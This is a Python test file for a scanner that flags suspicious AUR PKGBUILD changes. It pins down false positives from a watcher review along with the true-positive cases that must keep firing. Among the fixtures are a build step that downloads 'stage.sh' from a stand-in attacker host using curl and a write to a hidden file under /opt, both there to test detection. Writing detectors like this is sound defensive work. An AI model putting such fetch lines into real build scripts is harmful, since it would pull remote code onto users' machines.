"""False positives from the 2026-10-27 watcher review.

Each case pins the benign shape that fired and the true-positive twin the
fix must keep.  The batch is the 10h window ending 2026-10-27T13:18Z: H042 on
onekey-wallet-bin, C001 on weave-merge and course2md-gui-bin, H059 on
python-scad123d, and SOURCE_BUCKET/NOVELTY on install-hook and project-host
URLs.
"""

from __future__ import annotations

import difflib
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.analysis.structural._hygiene import capability_in_diff  # noqa: E402
from trustsight.buckets import classify_urls  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402
from trustsight.differ._sources import extract_urls_from_diff  # noqa: E402
from trustsight.expansion import resolve_text  # noqa: E402
from trustsight.full_aur.temporal_engine import (  # noqa: E402
    HistorySnapshot,
    _name_repo_divergence_findings,
    source_repos_from_pkgbuild,
)


def _diff(lines, *, old=("pkgname=p", "pkgver=1", "pkgrel=1"), fn="build"):
    new = list(old) + ([f"{fn}() {{"] + list(lines) + ["}"]) if fn else list(old)
    return "".join(difflib.unified_diff(
        [f"{line}\n" for line in old],
        [f"{line}\n" for line in new],
        "a/PKGBUILD", "b/PKGBUILD", n=3,
    )), "\n".join(new) + "\n"


def _ids(lines, *, fn="build", current_text=None, pkg="p"):
    diff, new = _diff(lines, fn=fn)
    with shipped_config():
        fact = scan_diff(
            diff, rules=load_rules(), config=load_config(),
            package_name=pkg, current_text=current_text or new,
        )
    return {e.rule_id for e in fact.score_breakdown}


# H042 - a dot-suffixed desktop file inside a command substitution is not a
# hidden drop.  The parameter expansion resolves to the package name on HEAD;
# before the shared resolver, `${pkgname%-bin}` emptied and `.desktop` looked
# like a leading-dot basename.

_ONEKEY = """pkgname=onekey-wallet-bin
pkgver=6.6.3
pkgrel=1
_get_app_dir() {
\tfind "${srcdir}" -type f -name "resources.pak" -printf '%h\\n'
}
prepare() {
\tsed -i "s/AppRun --no-sandbox/${pkgname%-bin}/g" "$(_get_app_dir)/${pkgname%-bin}.desktop"
}
"""


def test_h042_a_desktop_file_in_a_command_substitution_is_quiet():
    assert "H042" not in _ids(
        ['  sed -i "s/x/y/g" "$(_get_app_dir)/${pkgname%-bin}.desktop"'],
        fn="prepare", current_text=_ONEKEY, pkg="onekey-wallet-bin")


def test_h042_an_absolute_hidden_drop_still_fires():
    assert "H042" in _ids(['  echo "1" > "/opt/.hidden"'])


# C001 - a package manager fetching its own registry is W002, not a payload
# fetch, and a bundled binary named in install/test operands is not execution.

def test_c001_a_package_manager_fetch_is_not_a_capability():
    diff, new = _diff([
        '  cargo fetch --locked --target "$(rustc --print host-tuple)"',
    ], fn="prepare")
    assert capability_in_diff(diff, new) is None


def test_c001_a_curl_fetch_in_a_build_function_still_fires():
    diff, new = _diff(
        ["  curl -o stage.sh https://evil.example/stage.sh"], fn="build")
    assert capability_in_diff(diff, new) == "a network fetch (curl)"


def test_c001_a_bundled_yt_dlp_file_is_not_a_capability():
    diff, new = _diff([
        "  if [ -f yt-dlp ]; then",
        '    install -Dm755 yt-dlp "$pkgdir/usr/lib/app/yt-dlp"',
        "  fi",
    ], fn="package")
    assert capability_in_diff(diff, new) is None


def test_c001_running_yt_dlp_still_fires():
    diff, new = _diff(["  yt-dlp https://example.test/video"], fn="build")
    assert capability_in_diff(diff, new) == "a network fetch (yt-dlp)"


# H059 - bash substring expansion names the same repository.

_SCAD = """pkgname=python-scad123d
_pkgname=scad123d
pkgver=0.8.0
pkgrel=1
url="https://github.com/etjones/scad123d"
source=("https://files.pythonhosted.org/packages/source/${_pkgname::1}/${_pkgname}/${_pkgname}-${pkgver}.tar.gz")
sha256sums=('044c3ef01d2ee9dd334e91731adf94e86a1e84eeb2f968243db74afaa812451e')
"""


def test_h059_substring_expansion_is_resolved():
    resolved = resolve_text(
        "${_pkgname::1}/${_pkgname}", {"_pkgname": "scad123d"})
    assert resolved == "s/scad123d"


def test_h059_the_pythonhosted_repo_matches_its_name():
    repos = source_repos_from_pkgbuild(_SCAD)
    assert repos and all("scad123d" in repo for repo in repos)
    snapshot = HistorySnapshot(
        new_meta={}, old_meta=None,
        changes={"python-scad123d": "added"}, transitions={},
        source_repos={"python-scad123d": repos},
    )
    assert _name_repo_divergence_findings(snapshot) == []


def test_h059_an_unresolved_repo_is_unknown_not_divergent():
    snapshot = HistorySnapshot(
        new_meta={}, old_meta=None,
        changes={"python-scad123d": "added"}, transitions={},
        source_repos={"python-scad123d": {
            "https://files.pythonhosted.org/packages/source/${_pkgname::1}/x.tar.gz"}},
    )
    assert _name_repo_divergence_findings(snapshot) == []


def test_h059_a_genuinely_unrelated_repo_still_fires():
    snapshot = HistorySnapshot(
        new_meta={}, old_meta=None,
        changes={"quantum-widget": "added"}, transitions={},
        source_repos={"quantum-widget": {"https://github.com/other/llama-tools"}},
    )
    assert [f["rule_id"] for f in _name_repo_divergence_findings(snapshot)] == ["H059"]


# SOURCE_BUCKET/NOVELTY - a URL in an install hook is a runtime endpoint.

def test_install_hook_url_is_not_scored_as_a_source():
    diff = (
        "--- a/comfyui.install\n"
        "+++ b/comfyui.install\n"
        "@@ -1,2 +1,3 @@\n"
        " post_install() {\n"
        '+  "$pip" install torch --extra-index-url https://download.pytorch.org/whl/cu130\n'
        " }\n"
    )
    changes = extract_urls_from_diff(diff)
    assert "https://download.pytorch.org/whl/cu130" in changes.declared_urls

    with shipped_config():
        fact = scan_diff(
            diff, rules=load_rules(), config=load_config(),
            package_name="comfyui",
            current_text="pkgname=comfyui\npkgver=1\ninstall=comfyui.install\n",
        )
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "SOURCE_BUCKET" not in ids and "NOVELTY" not in ids


# Project-owned release hosts are not an unknown bucket.

def test_project_release_hosts_are_official():
    urls = [
        "https://files.grass.io/file/x.deb",
        "https://eda.gowinsemi.cn/Gowin.tar.gz",
        "https://git.bnema.dev/neferafk.git",
        "https://git.timfalken.com/api/v1/x",
    ]
    with shipped_config():
        buckets = classify_urls(urls)
    assert buckets == {url: "official" for url in urls}
